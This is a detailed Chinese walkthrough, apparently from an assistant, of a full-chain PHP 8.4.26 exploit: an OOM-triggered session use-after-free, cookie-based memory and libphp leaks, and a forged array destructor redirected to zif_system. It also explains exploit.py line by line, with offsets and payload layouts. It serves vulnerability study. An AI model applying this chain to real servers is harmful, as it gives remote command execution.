继续。整条攻击可以压缩成一句话：

> **multipart 解析期间触发 OOM → `longjmp` 中断请求启动 → Session 清理被跳过 → 留下 `PS()` 悬空指针 → 用 Cookie 泄漏堆和 `libphp` 地址 → 伪造 Session 引用、数组和函数调用帧 → 将数组析构函数变成 `zif_system()`。**

这里攻击的不是你的 `index.php`，而是 **PHP 在应用代码运行前解析 POST 请求的过程**。

下面以你实际复现成功的 **PHP 8.4.26、amd64、Apache mod_php、单 prefork worker** 环境为准。

---

# 一、先理解最基础的几个概念

## 1. OOM 是什么

OOM 是 **Out Of Memory，内存耗尽**。

这里通常不是整台机器没内存，而是 PHP 请求的内存使用量触及 `memory_limit`。

例如 PHP 正在解析一个普通表单字段，需要不断扩大保存字段内容的缓冲区：

```text
已有 4 MB → 扩展到 8 MB → 扩展到 16 MB → 触及 memory_limit
```

此时 Zend 内存管理器会报错并调用 `zend_bailout()`，而不是简单地让 `erealloc()` 返回空指针。

关键源码：

- [`Zend/zend_alloc.c:404`](https://github.com/php/php-src/blob/php-8.4.26/Zend/zend_alloc.c#L404)：`zend_mm_safe_error()`
- [`Zend/zend.c:1255`](https://github.com/php/php-src/blob/php-8.4.26/Zend/zend.c#L1255)：`_zend_bailout()`

末尾实际执行：

```c
LONGJMP(*EG(bailout), FAILURE);
```

---

## 2. Zend 是什么

Zend Engine 是 PHP 的核心引擎，负责：

- PHP 变量和类型；
- 数组、字符串、对象；
- 内存分配；
- 函数调用；
- 异常和错误；
- 请求启动、执行与关闭。

所以下面这些名字都来自 PHP 的 C 层，而不是普通 PHP 应用代码：

| 名字 | 含义 |
|---|---|
| `zval` | 一个 PHP 变量的 C 层表示 |
| `zend_string` | PHP 字符串 |
| `zend_array` / `HashTable` | PHP 数组 |
| `zend_reference` | PHP 引用 |
| `zend_execute_data` | 一次函数调用的 C 层调用帧 |
| `zif_system` | PHP `system()` 对应的 C 实现 |
| `EG(...)` | 访问 Zend 执行器全局状态 |
| `PS(...)` | 访问 Session 模块全局状态 |

---

## 3. `EG()` 和 `PS()` 不是普通函数

可以把它们理解成“访问某个全局结构体字段”的宏。

例如：

```c
EG(symbol_table)
```

大致表示：

```text
执行器全局状态 → PHP 符号表
```

而：

```c
PS(id)
PS(http_session_vars)
```

大致表示：

```text
Session 模块全局状态 → 当前 Session ID
Session 模块全局状态 → $_SESSION 对应的引用
```

**这次完整 EXP 真正利用的是 `PS()`，不是 `EG(user_error_handler)`。**

`php2shell-poc/exploit/chain_d.py:7` 中关于 `EG(user_error_handler)` 的描述，与当前这份完整 `exploit.py` 的实际利用链不同。

---

## 4. zval、字符串和引用计数

64 位环境下，一个 `zval` 是 16 字节：

```text
偏移  大小  内容
0x00  8     值，通常是整数或指针
0x08  4     类型及标志
0x0c  4     附加信息
```

例如一个字符串类型的 zval：

```text
value.ptr ───────→ zend_string
type_info = IS_STRING 相关标志
```

`zend_string` 的布局是：

```c
struct _zend_string {
    zend_refcounted_h gc;  // 8 字节
    zend_ulong h;          // 8 字节，哈希值
    size_t len;            // 8 字节，字符串长度
    char val[1];           // 真正的字符串内容
};
```

因此：

```text
字符串头起始地址 + 0x00 = gc
字符串头起始地址 + 0x08 = h
字符串头起始地址 + 0x10 = len
字符串头起始地址 + 0x18 = val
```

这里的 **`0x18` 是整个 EXP 反复出现的关键数字**。

引用计数则可以暂时理解为：

> 有多少个地方还在使用这个对象。

当计数降为 0，Zend 就销毁它。例如数组销毁时，还要销毁数组里的每个元素。

源码见 [`Zend/zend_types.h:318`](https://github.com/php/php-src/blob/php-8.4.26/Zend/zend_types.h#L318)。

---

## 5. 什么是 UAF

UAF 是 **Use-After-Free，释放后使用**。

假设：

```text
PS(id) ─────→ 一块保存 Session ID 的内存
```

后来这块内存被释放了，但 `PS(id)` 没改成 `NULL`：

```text
PS(id) ─────→ 已经释放、可能被其他数据重占的内存
```

下一次 PHP 再使用 `PS(id)`，就会把新内容误当成旧对象。

如果新内容可以控制，PHP 看到的就不再是普通字符串，而可能是攻击者伪造的结构体。

---

## 6. `longjmp` 是什么

普通函数返回：

```text
A 调用 B
B 调用 C
C 返回 B
B 返回 A
```

`setjmp/longjmp` 则像“保存一个返回书签，之后直接跳回去”：

```c
if (setjmp(保存点) == 0) {
    A();
    B();
    C();
} else {
    // 从很深的位置直接跳到这里
}
```

调用 `longjmp` 后：

- 不会按正常顺序从 C 返回 B、再返回 A；
- 中间的普通控制流被跳过；
- 但不等于“整个进程退出”；
- 也不等于“后面的所有 shutdown 都不执行”。

Zend 的 `zend_try` / `zend_catch` 就是围绕这套机制实现的。

---

# 二、OOM 为什么会产生 Session 悬空指针

## 1. 先纠正一个重要的文档错误

并不是：

> OOM 跳过了 `init_executor()`。

PHP 8.4.26 的真实顺序在 [`main/main.c:1839`](https://github.com/php/php-src/blob/php-8.4.26/main/main.c#L1839)：

```c
zend_activate();
sapi_activate();
...
php_hash_environment();
zend_activate_modules();
PG(modules_activated)=1;
```

而 [`Zend/zend.c:1315`](https://github.com/php/php-src/blob/php-8.4.26/Zend/zend.c#L1315) 明确显示：

```c
void zend_activate(void)
{
    ...
    init_compiler();
    init_executor();       // 已经在这里执行
    ...
}
```

所以准确说法是：

> **OOM 中断了 `php_hash_environment()` 中的 multipart 解析，跳过了后面的 `zend_activate_modules()`，导致 `PG(modules_activated)` 保持为 0。**

---

## 2. 请求中的实际执行顺序

```text
Apache 收到 POST
        │
        ▼
php_request_startup()
        │
        ├─ zend_activate()
        │     └─ init_executor()             ← 已执行
        │
        ├─ sapi_activate()
        │     └─ 准备/读取请求体
        │
        ├─ php_hash_environment()
        │     └─ 解析 multipart POST
        │           ├─ 读取 PHPSESSID
        │           ├─ 读取 PHP_SESSION_UPLOAD_PROGRESS
        │           ├─ 遇到上传文件
        │           ├─ 初始化 Session 和上传进度
        │           └─ 解析末尾大字段时 OOM
        │
        ├─ zend_activate_modules()            ← 被跳过
        └─ PG(modules_activated) = 1          ← 被跳过
```

Session 上传进度入口在 [`ext/session/session.c:3224`](https://github.com/php/php-src/blob/php-8.4.26/ext/session/session.c#L3224)。

遇到文件开始事件时：

```c
php_rinit_session(0);
PS(id) = zend_string_init(...);
```

见 [`ext/session/session.c:3311`](https://github.com/php/php-src/blob/php-8.4.26/ext/session/session.c#L3311)。

---

## 3. 为什么 shutdown 仍然执行，却漏掉了 Session 清理

Apache 外层捕获 bailout 后，仍会进入请求销毁流程。

但 [`main/main.c:1931`](https://github.com/php/php-src/blob/php-8.4.26/main/main.c#L1931) 写着：

```c
if (PG(modules_activated)) {
    zend_deactivate_modules();
}
```

因为 OOM 时这个标志仍为 0，所以扩展的正常 RSHUTDOWN 被跳过。

Session 本来应当在这里清理：

```c
zval_ptr_dtor(&PS(http_session_vars));
ZVAL_UNDEF(&PS(http_session_vars));

zend_string_release_ex(PS(id), 0);
PS(id) = NULL;
```

见 [`ext/session/session.c:139`](https://github.com/php/php-src/blob/php-8.4.26/ext/session/session.c#L139)。

然而它被跳过了，后续请求内存销毁又会释放请求堆，于是形成：

```text
PS(id)                 → 已释放的 zend_string
PS(http_session_vars)  → 已释放的 zend_reference
```

这就是本 EXP 的两个 UAF 入口：

- `PS(id)`：用于信息泄漏；
- `PS(http_session_vars)`：用于最终控制析构流程。

---

## 4. 为什么要求同一个 Apache worker

这些残留指针位于**某个 Apache/PHP 进程的地址空间里**。

如果：

```text
请求 A → worker 1，产生悬空指针
请求 B → worker 2
```

worker 2 没有 worker 1 的这套状态，也就无法继续。

这就是“单 prefork worker”对这个 EXP 很重要、但它不是漏洞本身必要前提的原因。

---

# 三、三阶段攻击到底在做什么

## 阶段 1：把 `Set-Cookie` 变成内存读取器

Session 发送 Cookie 时调用：

```c
e_id = php_url_encode(ZSTR_VAL(PS(id)), ZSTR_LEN(PS(id)));
```

见 [`ext/session/session.c:1429`](https://github.com/php/php-src/blob/php-8.4.26/ext/session/session.c#L1429)。

正常情况下：

```text
PS(id) → zend_string
         len = 19
         val = "attacksessionid0001"
```

通过堆布局控制，让旧的 `PS(id)` 指向伪造字符串：

```text
PS(id) → 伪造 zend_string
         len = 0x1000
         val = 后面的堆内存
```

PHP 不知道它是假的，于是读取 `val` 后面的 4096 字节，并 URL 编码进：

```http
Set-Cookie: PHPSESSID=...
```

攻击者收到后解码，就得到一块原始堆内存。

然后扫描其中像指针的 8 字节值，按 2 MiB 对齐统计，找出 Zend Memory Manager 的 chunk 基址。

---

## 阶段 2：泄漏 `libphp` 地址，绕过库 ASLR

ASLR 会使 `libphp.so` 每次加载到不同地址。

但同一个已经加载的二进制中：

```text
zif_system 地址 = libphp 基址 + 固定偏移
```

这个环境中的两个偏移为：

```text
zval_ptr_dtor = libphp + 0x65eb60
zif_system    = libphp + 0x465370
```

第二阶段把泄漏窗口扩大到：

```text
0x20000 = 131072 字节
```

同时制造 150 个数组，使堆中出现数组的 `zval_ptr_dtor` 函数指针。

脚本寻找满足以下条件的值：

```text
ptr - 0x65eb60 是 0x1000 的整数倍
并且同一个 ptr 至少出现 4 次
```

于是：

```text
libphp = ptr - 0x65eb60
zif_system = libphp + 0x465370
```

注意：`zif_system` 是 **PHP 的 C 函数处理器**，不是 libc 的 `system()` 地址。

---

## 阶段 3：伪造引用和数组，把析构变成函数调用

`_SESSION` 的初始化使用 `zend_reference`：

```c
ZVAL_NEW_REF(&PS(http_session_vars), &session_vars);
Z_ADDREF_P(&PS(http_session_vars));
zend_hash_update_ind(&EG(symbol_table), ...);
```

见 [`ext/session/session.c:239`](https://github.com/php/php-src/blob/php-8.4.26/ext/session/session.c#L239)。

第三阶段先通过 OOM 留下悬空的 `PS(http_session_vars)`，再喷入大量同尺寸字符串，希望其中一个重占旧引用所在的内存。

伪造引用如下：

```text
zend_reference.gc.refcount = 1
zend_reference.gc.type     = IS_REFERENCE = 10

zend_reference.val.ptr     → 伪造 zend_array
zend_reference.val.type    = 0x307 = IS_ARRAY_EX
zend_reference.sources     = 0
```

当 Zend 销毁它时：

```text
销毁伪造 zend_reference
        │
        ▼
销毁 ref.val
        │
        ▼
把它当作 IS_ARRAY
        │
        ▼
zend_array_destroy(fake_ht)
        │
        ▼
调用 fake_ht->pDestructor(E)
        │
        ▼
实际进入 zif_system(E)
```

---

# 四、伪造数组为什么能调用 `system()`

## 1. `zend_array` 中有一个函数指针

[`Zend/zend_types.h:391`](https://github.com/php/php-src/blob/php-8.4.26/Zend/zend_types.h#L391) 中：

```c
struct _zend_array {
    ...
    Bucket *arData;
    uint32_t nNumUsed;
    uint32_t nNumOfElements;
    ...
    dtor_func_t pDestructor;
};
```

在 64 位 PHP 8.4.26 中：

```text
arData       位于 +0x10
nNumUsed     位于 +0x18
pDestructor  位于 +0x30
```

正常数组通常是：

```c
ht->pDestructor = zval_ptr_dtor;
```

其作用是释放数组元素。

脚本却把它换成：

```c
ht->pDestructor = zif_system;
```

---

## 2. 析构函数和 PHP 内部函数的第一个参数恰好兼容

正常析构回调近似是：

```c
void destructor(zval *zv);
```

PHP 内部函数则是：

```c
void zif_system(
    zend_execute_data *execute_data,
    zval *return_value
);
```

两种函数类型本来完全不兼容，不能合法地互相转换。

但在 amd64 System V 调用约定下：

```text
第一个参数都通过 RDI 寄存器传入
```

因此执行：

```c
ht->pDestructor(E);
```

相当于把 `E` 放入 RDI，再跳到 `zif_system`。

`zif_system` 会把 `E` 当作 `zend_execute_data *` 来读取。

这就是 **类型混淆加代码重用**：没有注入新的机器码，而是复用了已有的 PHP 函数。

---

## 3. 同一块 Bucket 同时充当调用帧

`Bucket` 是数组中的一个元素：

```c
typedef struct _Bucket {
    zval val;          // 16 字节
    zend_ulong h;      // 8 字节
    zend_string *key;  // 8 字节
} Bucket;              // 共 32 字节
```

而 `zend_execute_data` 的关键偏移是：

| 偏移 | 字段 |
|---|---|
| `+0x18` | `func` |
| `+0x20` | `This` |
| `+0x2c` | `This.u2.num_args` |
| `+0x50` | 第一个参数的 zval |

脚本令：

```text
E = fake_ht->arData
```

所以 `E` 同时是：

1. 数组中唯一 Bucket 的地址；
2. 传给 `zif_system` 的伪造 `zend_execute_data`。

最后形成：

```text
E+0x2c = 1                         一个参数
E+0x50 = 命令字符串的地址           第一个参数.value.str
E+0x58 = IS_STRING = 6              第一个参数.type
```

于是效果近似于：

```php
system($controlled_command);
```

只是这里没有通过 PHP 引擎的正常函数查找，所以也不受 `disable_functions` 对普通 PHP 调用的限制。

---

# 五、`r0` 和 `0x18` 到底是什么

`r0` 是脚本猜测的、**悬空 Session 引用相对于 Zend chunk 基址的位置**：

```text
悬空 zend_reference ≈ chunk + r0
```

信息泄漏给出了 `chunk`，但不能直接给出精确的 `r0`，所以脚本要扫描。

脚本喷入的字符串内容长度是：

```python
SPRAY_VLEN = 4071
```

真正的 Zend 分配大小为：

```text
zend_string 头 24 字节
+ 内容 4071 字节
+ 结尾 NUL 1 字节
= 4096 字节
```

假设某个真实字符串对象从 `S` 开始：

```text
S+0x00  zend_string.gc
S+0x08  zend_string.h
S+0x10  zend_string.len = 4071
S+0x18  POST 中可控的 buf[0]
```

因此，如果希望旧引用地址 `r0` 指向伪造的 `zend_reference` 头，就必须在：

```python
ref_off = (r0 & 0xfff) - 0x18
```

处开始填写。

同理，希望伪造数组头位于：

```text
page + 0x800
```

则它相对字符串正文的偏移必须是：

```python
ht_off = 0x800 - 0x18 = 0x7e8
```

**减去 `0x18` 不是魔法，而是在把“zend_string 头的地址”转换成“其可控正文 buf 的下标”。**

---

# 六、逐行解释 `exploit.py`

文件为 `PHP2Shell-Full-Chain-Exploit/exploit.py`。空行只负责排版，下面覆盖所有有实际内容的行。

## 1. 第 1–30 行：解释器、模块和布局常量

| 行号 | 作用 |
|---|---|
| 1 | 让系统用 `python3` 执行脚本。 |
| 2 | 延迟求值类型注解，避免部分前向引用问题。 |
| 4 | `argparse`：解析 `--host`、`--cmd` 等参数。 |
| 5 | `re`：从 HTTP 响应提取 Cookie、状态码和 filler 编号。 |
| 6 | `socket`：手工建立 TCP 连接。 |
| 7 | `ssl`：可选 HTTPS。 |
| 8 | `struct`：按指定偏移写入小端整数和指针。 |
| 9 | `sys`：输出、退出码和 TTY 检测。 |
| 10 | `time`：等待、耗时统计和 sleep oracle。 |
| 11 | URL 解码 Cookie，恢复原始泄漏字节。 |
| 12 | `Counter`：统计候选堆地址和函数指针出现次数。 |

常量：

| 行号 | 含义 |
|---|---|
| 14 | 当前 amd64 `libphp` 中 `zif_system` 的偏移。 |
| 15 | `zval_ptr_dtor` 的偏移，用来反推 `libphp` 基址。 |
| 17–18 | 只接受这个范围内的候选指针；是环境假设，不是通用指针范围。 |
| 19 | 命令最长 256 字节。 |
| 20 | 后续请求使用的固定 Session ID。 |
| 22 | 末尾大字段为 12 MiB；与前面的分配共同触发 OOM。 |
| 23 | 第一阶段先尝试 892 个 filler 来调整重占位置。 |
| 24 | 第二阶段泄漏 128 KiB。 |
| 25 | 第二阶段制造 150 个数组。 |
| 26 | 制造悬空引用前加入 32 个小字段，调整堆布局。 |
| 27 | 伪造数组希望位于目标 4 KiB 页的 `+0x800`。 |
| 28 | 喷入字符串正文长度 4071，使整个分配正好是 4096 字节。 |
| 29 | 每次喷 400 个字符串，提高重占概率。 |
| 30 | sleep oracle 使用 5 秒。 |

---

## 2. 第 33–43 行：构造 multipart 请求体

`_mp(parts, boundary)` 把字段数组转换成 HTTP multipart 格式。

- **33**：接收字段列表和 boundary。
- **34**：使用可修改的 `bytearray` 拼接二进制数据。
- **35**：按给定顺序处理字段；顺序会影响 PHP 的解析和堆布局。
- **36**：写入 `--boundary\r\n`。
- **37**：写字段名。
- **38–40**：如果存在 `filename`，按文件上传字段处理，否则就是普通字段。
- **41**：写空行、字段二进制内容和 CRLF。
- **42**：写最后一个结束 boundary。
- **43**：转换成不可变 `bytes` 返回。

这里普通字段和文件字段的区别非常重要：**只有文件字段会触发 Session 上传进度的 `FILE_START` 路径。**

---

## 3. 第 46–119 行：原始 HTTP 客户端

### 第 46–50 行

`Target` 保存：

```text
host、port、path、https、timeout
```

它不代表 PHP 应用对象，只是网络目标参数。

### 第 52–67 行：建立连接

- 最多尝试 10 次；
- `socket.create_connection()` 建立 TCP；
- HTTPS 时用默认 SSL 上下文包装，并设置 SNI；
- `TCP_NODELAY` 禁用 Nagle 算法，减少小块发送延迟；
- 设置失败可忽略；
- 每次连接失败等待 0.3 秒；
- 全部失败后抛出最后一次异常。

### 第 69–97 行：发送 POST

- **71–75**：构造 HTTP/1.1 请求头，使用精确的 `Content-Length`，不是 chunked 编码。
- **76–77**：连接并设置超时。
- **80**：发送请求头。
- **81–83**：通过 `memoryview` 每次发送 256 KiB，避免复制整个大请求。
- **84–85**：忽略发送错误；目标 OOM 或崩溃时断开连接是预期情况。
- **86–95**：持续读取响应，直到 EOF、异常或达到 `read_cap`。
- **96–97**：无论成功与否都关闭 socket。

### 第 99–119 行：GET 和结果读取

- 构造 GET 请求；
- 建立连接、发送并读取响应；
- 以 `\r\n\r\n` 分离 HTTP 头和正文；
- 从状态行提取三位状态码；
- 无法识别时返回状态码 0；
- 返回 `(status, body)`。

`confirm()` 后面用它读取 `/pwn.txt`。

---

## 4. 第 122–152 行：解析泄漏数据

### 第 122–124 行：提取 Cookie

正则寻找：

```http
Set-Cookie: PHPSESSID=...; path=/
```

然后 URL 解码。

`latin1` 用于一一对应字节值，
避免 Unicode 解码破坏泄漏内容。

这个正则依赖 `; path=/` 的格式，并不是任意 Cookie 配置都适用。

### 第 127–138 行：寻找 Zend heap chunk

- 少于 1000 字节认为泄漏不足；
- 从每个字节位置读取 8 字节小整数，而不是只按 8 字节对齐扫描；
- 过滤 `PTR_MIN <= value < PTR_MAX`；
- `v & ~0x1FFFFF` 把地址向下对齐到 2 MiB；
- 统计哪个对齐基址出现最多；
- 至少出现 8 次才接受，降低随机误报。

返回的是 Zend MM chunk 基址，不是整个进程的“堆起点”。

### 第 141–152 行：寻找 `libphp` 基址

- 至少要有 16 字节；
- 这次按 8 字节步长扫描；
- 候选值必须在指针范围内；
- `(ptr - dtor_off) % 0x1000 == 0` 检查减去偏移后是否页对齐；
- 同一指针至少出现 4 次才接受；
- 返回 `ptr - dtor_off`。

`stage1` 和 `stage2` 本质都是对 Cookie 泄漏出来的原始内存做启发式识别。

---

## 5. 第 155–239 行：制造 UAF 和两阶段泄漏

### 第 155–166 行：保存 Exploit 状态

构造函数保存：

```text
Target
命令字节
zif/dtor 偏移
当前 r0 偏移
filler 数量
是否静默
```

`log()` 只在非 quiet 模式输出并立即 flush。

主程序后来使用 `quiet=True`，因此自校准提示默认不会显示。

### 第 168–172 行：文件和 OOM 字段

`_file()` 创建：

```text
字段名 f
文件名 a.txt
64 个 A
```

它的重点不是文件内容，而是触发 `MULTIPART_EVENT_FILE_START`。

`_oom()` 创建 12 MiB 的 `B` 字段，放在文件之后，使 Session 已初始化后再发生 OOM。

### 第 174–182 行：`_trigger()`

字段顺序是：

```text
PHPSESSID = 19 个 a
PHP_SESSION_UPLOAD_PROGRESS = pwn
32 个 padding 字段
文件字段
12 MiB 大字段
```

padding 名格式化成至少 6 位数字，再截断到总长 7，控制字段名尺寸。

随后用 `S * 17` 作为 boundary 发送，超时至少 90 秒，最后等待 0.3 秒让 worker 完成异常清理。

该函数用于第三阶段前制造新的悬空 Session 状态。

### 第 184–195 行：`rotate()`

第一轮发送：

- 1001 个 3000 字节字段；
- `PHPSESSID = "\x00"`；
- 上传进度字段；
- 文件字段；
- OOM 字段。

作用是重新布置、消耗和释放请求堆，避免一直沿用上一次失败的布局。

第二轮只发送固定 `SID` 和上传进度字段，使用另一个 boundary，再等待 0.5 秒。

`rotate()` 不是“转动 Session ID”，而是**重新整理 worker 的请求堆状态**。

### 第 197–217 行：`_leak_request(window, arrays)`

先发送一轮 OOM：

```text
1001 个单字节字段
PHPSESSID = NUL
上传进度字段
文件字段
大字段
```

然后发送真正的泄漏请求：

1. 固定 `SID` 和上传进度字段；
2. 添加 `self.fillers` 个 48 字节字段；
3. 每个字段以 `v0000`、`v0001` 等编号开头；
4. 添加名字为 `1999` 的 79 字节伪造字段；
5. 可选添加 `a0000[0]` 等数组字段；
6. 从响应 Cookie 中取出泄漏字节。

伪造字段的关键两行：

```python
struct.pack_into("<Q", forge, 0x10, window)
forge[0x18] = ord("L")
```

- `<Q`：8 字节小端无符号整数；
- `0x10`：覆盖伪造 `zend_string.len`；
- `0x18`：字符串正文的第一个字节写成 `L`；
- 后面才是希望越界读取的堆内容。

### 第 219–225 行：自动调整 filler

如果 Cookie 只包含完整的：

```text
v0123xxxxxx...
```

说明看到的是一个 filler，而不是预期的越界内存。

脚本取出编号，若它非零且与当前 filler 数不同，就把：

```python
self.fillers = idx
```

这是根据实际重占位置修正堆布局，不是在调整 PHP 配置。

### 第 227–232 行：`stage1()`

请求 4096 字节窗口、不制造额外数组，然后寻找 chunk。

失败时尝试用完整 filler 内容自校准。

### 第 234–239 行：`stage2()`

请求 128 KiB 窗口和 150 个数组，再寻找 `libphp` 基址。

如果响应太短，先自校准并返回 0。

注意：主程序后面使用的是 `leak_once()`，其中直接调用了 `_leak_request()`，并没有调用这个 `stage2()` 包装函数；两者逻辑相近。

---

## 6. 第 241–270 行：构造最终伪造结构

### 第 241–243 行

`_payload(htdata, zif)` 接收：

- 伪造数组的预测绝对地址；
- `zif_system` 的真实运行时地址。

分配：

```python
bytearray(0x98 + len(cmd) + 1)
```

`+1` 给命令末尾保留 NUL，因为 C 的 `popen()` 需要 NUL 结尾字符串。

### 第 244–249 行：伪造 `HashTable`

| 行 | 写入 | 作用 |
|---|---|---|
| 244 | `gc = {1, 7}` | 引用计数 1，GC 类型为 `IS_ARRAY`。 |
| 245 | `flags=0x10`，`mask=-8` | `HASH_FLAG_STATIC_KEYS`；掩码对应大小 8 的表。 |
| 246 | `arData=htdata+0x20` | 唯一 Bucket 位于 `E=0x20`。 |
| 247 | `nNumUsed=1`，`nNumOfElements=1` | 让销毁路径处理一个元素。 |
| 248 | `nTableSize=8`，内部指针 0 | 维持最小表尺寸等元数据。 |
| 249 | `pDestructor=zif` | 将数组元素析构入口改成 `zif_system`。 |

`0x10` 不含 `HASH_FLAG_PACKED`，所以走 Bucket，而不是纯 zval 的 packed 数组路径。

### 第 250–255 行：Bucket 与调用帧重叠

- **250**：令 `E=0x20`。
- **251**：`E+0x08=6`，让 Bucket 的 zval 类型为 `IS_STRING`。
- **252**：`E+0x10=zif`，该位置既是 `Bucket.h`，也是伪造调用帧的 `func` 元数据。
- **253**：`E+0x2c=1`，声明一个函数参数。
- **254**：`E+0x50=htdata+0x80`，第一个参数指向伪造命令字符串。
- **255**：`E+0x58=6`，第一个参数是字符串。

真正决定跳转入口的是 `pDestructor`；`func` 字段的写入让伪造帧保持一致，不应理解为 Zend 在这里正常分派了一次 PHP 函数。

### 第 256–259 行：伪造命令字符串

- `0x80`：写入 `{refcount=1, type_info=0x106}`，对应字符串 GC 类型。
- `0x90`：写入命令长度。
- `0x98`：复制命令字节。
- 最后返回完整二进制 payload。

`zif_system()` 经 PHP 的执行封装最终使用这个命令调用 shell；原命令中的 `>` 重定向也是由 shell 解释的。

### 第 261–270 行：生成一个喷入字符串

- 创建 4071 个 `.`；
- 开头写 `SPRAY000` 等标记，便于识别；
- 在 `ref_off` 写伪造 `zend_reference`：
  - `{1,10}`：引用计数 1、类型 `IS_REFERENCE`；
  - `+0x08=htdata`：内部 zval 指向伪造数组；
  - `+0x10=0x307`：内部 zval 是 `IS_ARRAY_EX`；
  - `+0x18=0`：`sources=NULL`。
- 在 `ht_off` 放入前面构造的 HashTable/Bucket/调用帧/命令；
- 返回恰好 4071 字节的正文。

`0x307` 表示数组类型加引用计数、可 GC 标志，不是地址。

---

## 7. 第 272–310 行：扫描并重占悬空引用

### 第 272–285 行：普通 `stage3()`

```python
page = (chunk + self.r0_off) & ~0xFFF
```

取猜测引用所在的 4 KiB 页。

```python
htdata = page + 0x800
ref_off = (r0 & 0xFFF) - 0x18
ht_off = 0x800 - 0x18
```

分别计算：

- 伪造数组绝对地址；
- 伪造引用在字符串正文中的偏移；
- 伪造数组在字符串正文中的偏移。

然后：

1. 生成 payload；
2. `_trigger()` 制造悬空引用；
3. 下一请求发送固定 SID 和上传进度字段；
4. 喷 400 个相同尺寸、带不同编号的字符串；
5. 期待其中一个重占旧引用并在销毁时进入 `zif_system`。

### 第 287–300 行：把多个 low-bits 候选打包

`_packed_value()` 在一次喷入中尝试多个 `r0 & 0xfff`。

对每个候选：

- 计算 `ro = low - 0x18`；
- 排除负偏移、越过正文末尾的候选；
- 排除与伪造 HashTable 区域重叠的候选；
- 写入相同的伪造 reference；
- 最后把共享的 HashTable payload 放到 `0x800-0x18`。

这样一次请求可以试四个低位候选。

### 第 302–310 行：`stage3_packed()`

- `page_off` 来自主循环的页扫描；
- 取该页并构造 packed value；
- 重新 `_trigger()`；
- 喷 400 个内容完全相同的字符串；
- 发送后返回，由主循环检查命令是否执行。

与普通 `stage3()` 的区别是：**普通模式一次请求试一个 low-bits，packed 模式一次试一组。**

---

## 8. 第 313–405 行：显示、结果判定和重试

### 第 313–348 行：终端颜色和十六进制输出

- `_TTY` 判断标准输出是否是交互终端；
- `_c()` 仅在 TTY 中添加 ANSI 颜色；
- `banner()` 打印框线标题；
- `hexdump()` 每行显示 16 字节；
- 将每行拆成左右各 8 字节；
- 可显示 ASCII 的点替换不可打印字符；
- 如果某个 8 字节窗口像指针，就把对应字节着色；
- `base` 只影响显示地址，不改变数据。

这些代码不参与内存破坏。

### 第 351–374 行：进度条

- 保存总数、标签和开始时间；
- `update()` 计算完成比例、填充 30 格进度条；
- 根据当前平均耗时估算 ETA；
- TTY 中用回车覆盖当前行；
- 非 TTY 中每 10 次或最后一次才打印；
- `done()` 在 TTY 中补换行。

### 第 377–384 行：文件结果 oracle

`confirm()`：

1. GET `fetch` 路径；
2. 状态码必须为 200；
3. 去掉空白后的正文必须非空；
4. 返回解码后的正文；
5. 任何异常都当作未命中。

它只检查“文件存在且非空”，**并不验证内容一定是本次命令生成的**。如果 `/pwn.txt` 是旧文件，理论上可能误判。

### 第 387–405 行：完整泄漏重试

`leak_once()`：

1. 先 `rotate()`；
2. 最多执行 `retries` 次 stage 1；
3. 每次失败后重新 rotate；
4. 没有 chunk 就返回三个空结果；
5. 有 chunk 后请求一次大窗口泄漏；
6. 计算 `libphp`；
7. 失败则继续 rotate 和大窗口泄漏，直到达到重试次数；
8. 返回 `(chunk, libphp, raw)`。

`raw` 是最后一次原始泄漏，用于后续 hexdump。

---

## 9. 第 408–457 行：参数解析与初始化

### 第 408–428 行：CLI 参数

- `408–410`：创建解析器，说明会自动暴力发现 `r0`。
- `411`：目标主机，必填。
- `412`：端口，默认 80。
- `413`：默认命令是写 `id` 结果到 webroot。
- `414`：默认结果路径 `/pwn.txt`。
- `415`：是否改用 sleep 时间差判断。
- `416`：网络超时。
- `417`：目标 URL 路径。
- `418`：启用 HTTPS。
- `419–420`：允许覆盖两个二进制偏移，`int(x,0)` 支持 `0x...`。
- `421–423`：`r0` 页偏移的扫描下界、上界和步长；上界不包含在范围内。
- `424`：低 12 位候选列表。
- `425`：每轮泄漏重试次数。
- `426`：packed 模式下每多少页重新泄漏地址。
- `427`：是否关闭 packed，逐个尝试。
- `428`：实际解析命令行。

### 第 430–440 行：检查成功判定方式与命令

- 非 sleep 模式必须提供 `--fetch`；
- sleep 模式使用 `sleep 5`；
- 如果用户另外指定了非默认命令，则追加到 sleep 后；
- 非 sleep 模式直接使用 `--cmd`；
- 按 UTF-8 编码后的字节数检查 256 字节上限。

### 第 442–457 行：生成扫描计划

- 拆分并解析 low-bits；
- 创建页偏移列表；
- 创建 `Target`；
- 生成 oracle 描述；
- 打印目标、命令、判定方式和扫描规模；
- 记录开始时间；
- 创建 `Exploit`，初始 `r0_off=0`，静默内部日志。

你看到的：

```text
112 pages × 4 low-bits
```

来自：

```text
(0xc0000 - 0x50000) / 0x1000 = 112
```

---

## 10. 第 459–470 行：主程序的信息泄漏阶段

- 打印 `[1] infoleak`；
- 调用 `leak_once()`；
- 任一地址没拿到就输出你之前遇到的错误并返回 1；
- 否则计算：

```python
zif = libphp + a.zif_offset
```

- 打印前 160 字节泄漏；
- 显示 chunk、`libphp` 和 `zif_system`。

所以原来的：

```text
leak failed (worker not single-prefork, or dtor offset wrong)
```

只是一个概括性错误提示，并不证明 worker 一定错了。你的实际情况是 **arm64 与 amd64 的布局和偏移不匹配**。

---

## 11. 第 471–526 行：`r0` 扫描与命令结果判定

### 第 471–475 行

- thorough 模式生成 `(page, lowbit)` 的笛卡尔积；
- packed 模式每个 page 只有一项，`lb=None`；
- 打印 `[2] r0 sweep`。

### 第 477–486 行：建立 sleep 基线

如果启用 sleep oracle：

1. 先执行一次 packed stage 3；
2. 测量耗时作为 baseline；
3. 忽略 socket 异常；
4. 阈值设置为 `baseline + 2.5 秒`。

这次 baseline 请求本身也是一次利用尝试，不是纯粹的空网络测量。

### 第 488–501 行：逐项尝试

- 创建进度条；
- 初始化命中位置和证据；
- 从 1 开始枚举扫描顺序；
- thorough 模式把页和低位合成 `r0_off`，调用普通 `stage3()`；
- packed 模式调用 `stage3_packed()`；
- 记录本次耗时；
- 连接异常不立即停止扫描。

### 第 503–514 行：判断是否执行成功

sleep 模式：

```text
动态最低 baseline + 2.5 秒
```

达到阈值就判定命中，记录时间证据。

fetch 模式：

1. 等待 0.5 秒；
2. GET `--fetch`；
3. 返回非空内容就判定命中。

### 第 516–524 行：命中或重新泄漏

- 更新进度条；
- 命中后结束进度条；
- 保存 `hit_r0` 并跳出循环；
- packed 模式每 24 项重新泄漏；
- 新地址有效时更新 `chunk/libphp/zif`。

